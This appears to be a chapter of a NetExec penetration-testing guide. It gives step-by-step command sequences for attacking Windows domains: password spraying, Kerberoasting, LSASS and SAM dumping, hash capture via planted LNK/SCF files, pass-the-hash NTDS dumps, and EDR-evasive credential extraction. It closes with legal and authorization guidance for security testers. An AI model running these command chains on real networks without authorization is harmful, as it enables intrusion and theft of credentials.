# Practical Scenarios and Troubleshooting

## Beginner Scenarios

### Scenario 1: First Internal Network Scan

**Situation:** You're on an internal penetration test and have just plugged into the network. You have no credentials and need to discover what's there.

```bash
# Step 1: Discover hosts with SMB open
nxc smb 192.168.1.0/24
```

**Expected output:**
```
SMB         192.168.1.10    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.1.20    445    WS01             [*] Windows 10 Build 19041 x64 (name:WS01) (domain:CORP.LOCAL) (signing:False) (SMBv1:False)
SMB         192.168.1.25    445    SQL01            [*] Windows Server 2016 Build 14393 x64 (name:SQL01) (domain:CORP.LOCAL) (signing:False) (SMBv1:True)
SMB         192.168.1.30    445    FILE01           [*] Windows Server 2016 Build 14393 x64 (name:FILE01) (domain:CORP.LOCAL) (signing:False) (SMBv1:True)
```

**What you learn:**
- Domain name: CORP.LOCAL
- Domain controller: DC01 (192.168.1.10) — identified by signing:True
- 3 other hosts with SMB signing disabled — potential relay targets
- SQL01 and FILE01 still support SMBv1 — potential EternalBlue
- All Windows — typical AD environment

```bash
# Step 2: Try null session and guest access
nxc smb 192.168.1.10 -u '' -p '' --shares --users --rid-brute
nxc smb 192.168.1.10 -u 'guest' -p '' --shares
```

```bash
# Step 3: Generate relay target list
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

### Scenario 2: You Found a Password on a Sticky Note

**Situation:** During physical access, you found "jsmith / Welcome2024!" written on a sticky note.

```bash
# Step 1: Validate the credentials
nxc smb 192.168.1.10 -u jsmith -p 'Welcome2024!'

# Step 2: If valid, enumerate everything
nxc smb 192.168.1.10 -u jsmith -p 'Welcome2024!' --users --groups --shares --pass-pol --sessions

# Step 3: Check admin access across the network
nxc smb 192.168.1.0/24 -u jsmith -p 'Welcome2024!'

# Step 4: Check other protocols
nxc winrm 192.168.1.0/24 -u jsmith -p 'Welcome2024!'
nxc rdp 192.168.1.0/24 -u jsmith -p 'Welcome2024!'
nxc mssql 192.168.1.0/24 -u jsmith -p 'Welcome2024!'
```

---

## Intermediate Scenarios

### Scenario 3: Password Spray Campaign

**Situation:** You have a list of 200 usernames from LinkedIn OSINT. The client allows password spraying with caution.

```bash
# Step 1: Get the password policy FIRST
nxc smb 192.168.1.10 -u jsmith -p 'Welcome2024!' --pass-pol
# Result: Lockout Threshold: 5, Reset Counter: 30 minutes

# Step 2: Spray one password at a time (max 3 attempts per reset period)
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' --continue-on-success
# WAIT 35 MINUTES
nxc smb 192.168.1.10 -u users.txt -p 'Corp2024!' --continue-on-success
# WAIT 35 MINUTES
nxc smb 192.168.1.10 -u users.txt -p 'Welcome1!' --continue-on-success
```

**After finding valid credentials:**
```bash
# Check which protocols each valid user can access
nxc smb 192.168.1.0/24 -u valid_users.txt -p valid_passwords.txt --no-bruteforce --continue-on-success
nxc winrm 192.168.1.0/24 -u valid_users.txt -p valid_passwords.txt --no-bruteforce --continue-on-success
```

### Scenario 4: Share Analysis for Sensitive Data

**Situation:** You have valid credentials and need to find sensitive files on network shares.

```bash
# Step 1: Enumerate all shares across the network
nxc smb 192.168.1.0/24 -u jsmith -p 'Password123' --shares

# Step 2: Use spider_plus for thorough file indexing
nxc smb 192.168.1.30 -u jsmith -p 'Password123' -M spider_plus

# Step 3: Spider specific shares for passwords/credentials
nxc smb 192.168.1.30 -u jsmith -p 'Password123' --spider IT_Share --pattern 'password|credential|secret|key|config|backup'

# Step 4: Download interesting files
nxc smb 192.168.1.30 -u jsmith -p 'Password123' --get-file 'IT_Share\Scripts\deploy.ps1' /tmp/deploy.ps1
nxc smb 192.168.1.30 -u jsmith -p 'Password123' --get-file 'IT_Share\Configs\web.config' /tmp/web.config
```

### Scenario 5: Kerberoasting Campaign

**Situation:** You have a standard domain user and want to find crackable service account passwords.

```bash
# Step 1: Kerberoast all SPNs
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --kerberoasting /tmp/kerberoast.txt

# Output shows discovered SPNs:
# svc_sql - MSSQLSvc/sql01.corp.local:1433
# svc_http - HTTP/web01.corp.local
# svc_backup - cifs/file01.corp.local

# Step 2: Crack offline
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --rules /usr/share/hashcat/rules/best64.rule

# Step 3: Use cracked service account
nxc smb 192.168.1.0/24 -u svc_sql -p 'CrackedPassword!' --continue-on-success

# Step 4: If admin anywhere, dump credentials
nxc smb 192.168.1.25 -u svc_sql -p 'CrackedPassword!' --sam --lsa -M lsassy
```

---

## Advanced Scenarios

### Scenario 6: Domain Compromise via Credential Chaining

**Situation:** You have a standard user and need to achieve Domain Admin through credential chaining.

```bash
# Step 1: Start with standard user, find writable shares
nxc smb 192.168.1.0/24 -u jsmith -p 'Password123' --shares

# Step 2: Place SCF/LNK files on writable shares (with Responder listening)
nxc smb 192.168.1.30 -u jsmith -p 'Password123' -M slinky -o SERVER=10.10.10.5 NAME=Q4_Budget

# Step 3: Wait for hash capture via Responder, crack or relay it
# If admin.jones browses the share → NTLMv2 hash captured
hashcat -m 5600 captured_hash.txt rockyou.txt

# Step 4: Check admin.jones' access
nxc smb 192.168.1.0/24 -u admin.jones -p 'CrackedPass!'
# Result: Pwn3d! on WS01 and SQL01

# Step 5: Dump LSASS on Pwn3d hosts for more credentials
nxc smb 192.168.1.20 -u admin.jones -p 'CrackedPass!' -M lsassy
# Found: CORP.LOCAL\da_admin hash

# Step 6: PTH with Domain Admin hash
nxc smb 192.168.1.10 -u da_admin -H '<ntlm_hash>' --ntds
# GAME OVER — full NTDS dump
```

### Scenario 7: Bypassing Network Segmentation

**Situation:** You have admin on a workstation but the DC is on a different VLAN. The SQL server bridges both VLANs.

```bash
# Step 1: Verify you're admin on WS01
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'ipconfig /all'

# Step 2: Check what SQL01 can reach
nxc smb 192.168.1.25 -u svc_sql -p 'SQLPass!' -x 'ipconfig /all'
# Output shows SQL01 has interfaces on both 192.168.1.x and 10.0.0.x

# Step 3: Use SQL01 as pivot — execute commands that reach the DC VLAN
nxc mssql 192.168.1.25 -u sa -p 'SQLPass!' -x "powershell -c Test-NetConnection 10.0.0.10 -Port 445"

# Step 4: Set up a SOCKS proxy through SQL01 for NXC access to DC
# (Use Chisel, Ligolo-ng, or SSH tunneling for this step)
# Then run NXC through the proxy:
proxychains nxc smb 10.0.0.10 -u administrator -p 'Password123'
```

### Scenario 8: Zero to Domain Admin in Under 30 Minutes

**Situation:** Speed engagement — demonstrate fastest path to DA.

```bash
# Minute 0-2: Network discovery
nxc smb 10.10.10.0/24

# Minute 2-3: Check null session and relay targets
nxc smb 10.10.10.5 -u '' -p '' --rid-brute
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt

# Minute 3-5: Spray with common passwords
nxc smb 10.10.10.5 -u users.txt -p 'Company2024!' --continue-on-success

# Minute 5-7: Enum with found creds
nxc smb 10.10.10.0/24 -u found_user -p 'Company2024!'
# Found Pwn3d! on workstation 10.10.10.20

# Minute 7-10: Dump creds from Pwn3d host
nxc smb 10.10.10.20 -u found_user -p 'Company2024!' -M lsassy
# Found DA hash in LSASS!

# Minute 10-12: DCSync with DA hash
nxc smb 10.10.10.5 -u da_admin -H '<hash>' --ntds
# Domain compromised
```

---

## Expert Scenarios

### Scenario 9: Living Off the Land — Minimal Footprint

**Situation:** Heavy EDR environment, every tool execution is monitored. Must use native Windows capabilities only.

```bash
# Use wmiexec (no service creation)
nxc smb 192.168.1.20 -u admin -p 'Password123' --exec-method wmiexec

# Use built-in Windows commands only — no PowerShell (too monitored)
nxc smb 192.168.1.20 -u admin -p 'Password123' -x 'cmd /c dir \\192.168.1.30\c$\users'
nxc smb 192.168.1.20 -u admin -p 'Password123' -x 'cmd /c reg save HKLM\SAM C:\Windows\Temp\sam.save'
nxc smb 192.168.1.20 -u admin -p 'Password123' -x 'cmd /c reg save HKLM\SYSTEM C:\Windows\Temp\system.save'
nxc smb 192.168.1.20 -u admin -p 'Password123' --get-file 'C:\Windows\Temp\sam.save' /tmp/sam.save
nxc smb 192.168.1.20 -u admin -p 'Password123' --get-file 'C:\Windows\Temp\system.save' /tmp/system.save

# Parse offline with secretsdump
secretsdump.py -sam /tmp/sam.save -system /tmp/system.save LOCAL

# Clean up
nxc smb 192.168.1.20 -u admin -p 'Password123' -x 'del C:\Windows\Temp\sam.save C:\Windows\Temp\system.save'
```

### Scenario 10: Multi-Domain Trust Exploitation

**Situation:** CORP.LOCAL trusts PARTNER.LOCAL. You have DA in CORP.LOCAL and want to pivot.

```bash
# Step 1: Enumerate trusts
nxc ldap 192.168.1.10 -u administrator -p 'Password123' --trusted-for-delegation

# Step 2: Find trust accounts and inter-domain authentication paths
nxc smb 192.168.1.10 -u administrator -p 'Password123' -x 'nltest /domain_trusts /all_trusts'

# Step 3: If bidirectional trust, authenticate to partner DC
nxc smb partner-dc.partner.local -u administrator@CORP.LOCAL -p 'Password123'

# Step 4: Enumerate partner domain
nxc ldap partner-dc.partner.local -u administrator@CORP.LOCAL -p 'Password123' --users --groups

# Step 5: SID History/Golden Ticket for cross-domain (Mimikatz, then NXC)
export KRB5CCNAME=/tmp/cross_domain.ccache
nxc smb partner-dc.partner.local -k --use-kcache --ntds
```

---

## Common Mistakes and Troubleshooting

### Mistake 1: Not Checking Password Policy Before Spraying

**Problem:** Locked out 50 accounts because you sprayed 10 passwords without checking the lockout threshold.

**Fix:** ALWAYS run `--pass-pol` first. Stay 2 below the lockout threshold per reset period.

```bash
# ALWAYS DO THIS FIRST
nxc smb 192.168.1.10 -u anyuser -p anypass --pass-pol
```

### Mistake 2: Using IP Instead of Hostname for Kerberos

**Problem:** `nxc smb 192.168.1.10 -k` fails with Kerberos errors.

**Fix:** Kerberos requires hostnames, not IPs.

```bash
# WRONG
nxc smb 192.168.1.10 -u admin -p Pass -k

# CORRECT
nxc smb dc01.corp.local -u admin -p Pass -k
```

### Mistake 3: Forgetting --local-auth for Local Accounts

**Problem:** `nxc smb target -u administrator -p LocalPass` fails because it tries domain auth.

**Fix:** Add `--local-auth` when using local credentials.

```bash
# WRONG — tries to authenticate against AD
nxc smb 192.168.1.20 -u administrator -p 'LocalPass!'

# CORRECT — authenticates against local SAM
nxc smb 192.168.1.20 -u administrator -p 'LocalPass!' --local-auth
```

### Mistake 4: Spraying Against All Hosts

**Problem:** Spraying against 254 hosts creates 254× the logon events and may trigger different lockout behaviors.

**Fix:** Spray against one DC (all domain auth goes through the DC anyway).

```bash
# WRONG — creates events on every host
nxc smb 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# CORRECT — spray against DC only
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' --continue-on-success

# THEN check access across hosts with found creds
nxc smb 192.168.1.0/24 -u found_user -p 'Summer2024!'
```

### Mistake 5: Not Using --continue-on-success

**Problem:** NXC stops after the first valid credential, missing other valid accounts.

**Fix:** Always use `--continue-on-success` during spraying.

```bash
# WRONG — stops at first hit
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!'

# CORRECT — finds all valid credentials
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' --continue-on-success
```

### Mistake 6: Running NXC Without Proper DNS

**Problem:** NXC can't resolve domain names, Kerberos fails, LDAP queries fail.

**Fix:** Configure DNS to point at the domain controller.

```bash
# Add DC as DNS server
echo "nameserver 192.168.1.10" | sudo tee /etc/resolv.conf

# Or add hosts file entries
echo "192.168.1.10 dc01.corp.local corp.local" | sudo tee -a /etc/hosts
```

### Troubleshooting: Connection Timeout

```bash
# Increase timeout for slow networks
nxc smb 192.168.1.10 -u jsmith -p 'Password123' --timeout 30

# Use debug mode to see what's happening
nxc smb 192.168.1.10 -u jsmith -p 'Password123' --debug
```

### Troubleshooting: Module Not Found

```bash
# List available modules to verify the name
nxc smb -L

# Update NXC for latest modules
pipx upgrade netexec
```

### Troubleshooting: Hash Authentication Fails

```bash
# Ensure hash format is correct (32 hex chars for NT hash)
# WRONG
nxc smb 192.168.1.10 -u admin -H 'notahash'

# CORRECT — NT hash only
nxc smb 192.168.1.10 -u admin -H '5f4dcc3b5aa765d61d8327deb882cf99'

# CORRECT — LM:NT format
nxc smb 192.168.1.10 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99'
```

---

## Legal and Ethical Considerations

### Rules of Engagement

- **Always have written authorization** before running NXC against any network
- The scope of testing must clearly define which hosts, protocols, and techniques are permitted
- Password spraying, credential dumping, and lateral movement should be explicitly authorized
- Notify the client's SOC/blue team if required by the engagement rules
- Document all activities with timestamps for the final report

### Legal Framework

- Unauthorized use of NXC constitutes unauthorized access under computer crime laws (CFAA in the US, CMA in the UK, etc.)
- NXC is a dual-use tool — legitimate for authorized security testing, illegal for unauthorized access
- Even on authorized engagements, stay within scope — do not access systems outside the defined scope
- Handle extracted credentials and data according to the engagement's data handling agreement

### Responsible Disclosure

- If you discover critical vulnerabilities (e.g., Zerologon, default SA passwords), report them to the client immediately — don't wait for the final report
- If you achieve Domain Admin, verify with the client before dumping the full NTDS to ensure this is within scope
- Protect all extracted credentials — encrypt your loot, wipe after engagement completion

### OPSEC for the Client

- Coordinate password spraying times with the client to avoid production impact
- Avoid spraying during business hours if the lockout threshold is low
- If you lock out accounts, notify the client immediately
- Document exactly which accounts were locked and when
- Always clean up artifacts (uploaded files, created services, scheduled tasks) after the engagement
